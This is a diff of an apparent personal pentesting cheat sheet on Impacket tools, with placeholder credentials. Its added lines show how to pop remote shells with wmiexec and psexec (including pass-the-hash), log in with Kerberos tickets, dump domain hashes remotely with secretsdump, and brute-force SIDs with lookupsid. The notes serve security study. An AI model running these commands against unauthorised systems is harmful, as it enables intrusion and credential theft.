@@ -43,12 +43,22 @@ Most scripts operating require a **target** such as `username@IP`. You can speci
 
 ```shell!
 $ impacket-xxx username@IP
+$ impacket-xxx username@IP -no-pass
 $ impacket-xxx username:password@IP
 $ impacket-xxx username:password@IP -windows-auth
+$ impacket-xxx domain/username:'password'@IP
 ```
 
 `-windows-auth` can be specified to indicate that we want to use local authentication <small>(`.\username`)</small> instead of Active Directory authentication.
 </div><div>
+
+#### Impacket Alternative Logins
+
+On Linux, as per to these [notes](/operating-systems/cloud/active-directory/security/index.md#active-directory-on-linux), you can log in to active directory and get a TGT ticket. To use it with impacket tools, use `-k` and `-no-pass`.
+
+```shell!
+$ impacket-xxx DC01.example.com -no-pass -k
+```
 </div></div>
 
 <hr class="sep-both">
@@ -83,7 +93,7 @@ smbclient> tree
 
 #### wmiexec
 
-Pop a semi-interactive shell using [DCOM](/operating-systems/networking/protocols/dcom.md):
+Pop a semi-interactive shell using [DCOM](/operating-systems/networking/protocols/dcom.md). It runs commands as Local Administrator if possible, but creates a new process per command.
 
 ```shell!
 $ impacket-wmiexec -shell-type powershell username:password@IP
@@ -92,32 +102,43 @@ $ impacket-wmiexec -shell-type powershell username:password@IP "hostname"
 
 #### psexec
 
-Pop a semi-interactive remote shell using RemComSvc.
+Pop a semi-interactive remote shell using RemComSvc. It runs commands as SYSTEM to it's quite suspicious and making noise.
 
 ```shell!
-$ impacket-psexec -hashes lmhash:nthash username@IP
-$ impacket-psexec -hashes :nthash username@IP
+$ impacket-psexec username:password@IP
+$ impacket-psexec [...] -hashes lmhash:nthash
+$ impacket-psexec [...] -hashes :nthash
+$ impacket-psexec [...] -target-ip 172.16.5.5
 ```
 </div></div>
 
 <hr class="sep-both">
 
+## Impacket Servers
 
 <div class="row row-cols-lg-2"><div>
 
-<br>
+#### smbserver
 
-#### Samrdump
+[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
-List users and domains.
+Run a [SMB](../smb.md) server to which user will connect with the username XXX and the password YYY. Files will be stored in `/path/to/share`.
 
 ```shell!
-$ impacket-samrdump IP
-$ impacket-samrdump username:password@IP
+$ impacket-smbserver -smb2support share_name /path/to/share
+$ impacket-smbserver -smb2support -username XXX -password YYY share_name /path/to/share
+$ impacket-smbserver -smb2support -username username -password password share .
 ```
 </div><div>
+</div></div>
 
-#### SecretsDump
+<hr class="sep-both">
+
+## Windows Utilities
+
+<div class="row row-cols-lg-2"><div>
+
+#### secretsdump
 
 [![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
 
@@ -130,21 +151,43 @@ $ impacket-secretsdump -system ./system.hive -ntds ./ntds.dit LOCAL
 <output format is explained in the output>
 ```
 
-<br>
-
-<br>
-
-#### SMB server
-
-[![password_attacks](../../../../cybersecurity/_badges/htb/password_attacks.svg)](https://academy.hackthebox.com/course/preview/password-attacks)
-
-Run a [SMB](../smb.md) server to which user will connect with the username XXX and the password YYY. Files will be stored in `/path/to/share`.
+You can remotely dump hashes using:
 
 ```shell!
-$ impacket-smbserver -smb2support -username XXX -password YYY share_name /path/to/share
-$ impacket-smbserver -smb2support -username username -password password share .
-$ impacket-smbserver -smb2support share_name /path/to/share
+$ impacket-secretsdump domain/username:password@target
+$ impacket-secretsdump [...] -just-dc # ???
+$ impacket-secretsdump [...] -just-dc-user 'example.com/username'
+$ impacket-secretsdump [...] -outputfile hashes
 ```
+</div><div>
+</div></div>
+
+<hr class="sep-both">
+
+## Impacket MS-RPC Utilities
+
+<div class="row row-cols-lg-2"><div>
+
+Refer to [MS-RPC](/operating-systems/networking/protocols/rpc.md#rpc-smb-footprinting).
+
+#### samrdump
+
+List users and domains.
+
+```shell!
+$ impacket-samrdump IP
+$ impacket-samrdump username:password@IP
+```
+
+#### lookupsid
+
+Expose the domain SID and groups/usernames RID using brute force.
+
+```shell!
+$ impacket-lookupsid username:password@IP
+$ impacket-lookupsid -domain-sids username:password@IP
+```
+</div><div>
 </div></div>
 
 <hr class="sep-both">
@@ -157,10 +200,6 @@ Stuff that I found, but never read/used yet.
 
 ```shell!
 $ impacket-dpapi unprotect -file xxx -key "xxx"
-$ impacket-wmiexec domain/username:'password'@IP  # Local Admin but new process per command
-$ impacket-psexec domain/username:'password'@IP # SYSTEM so more suspicious
-$ impacket-secretsdump -outputfile hashes EXAMPLE\username:'password' -just-dc
-impacket-secretsdump -outputfile hashes EXAMPLE.COM/'username':'password'@DC01.EXAMPLE.COM
 ```
 </div><div>
 </div></div>
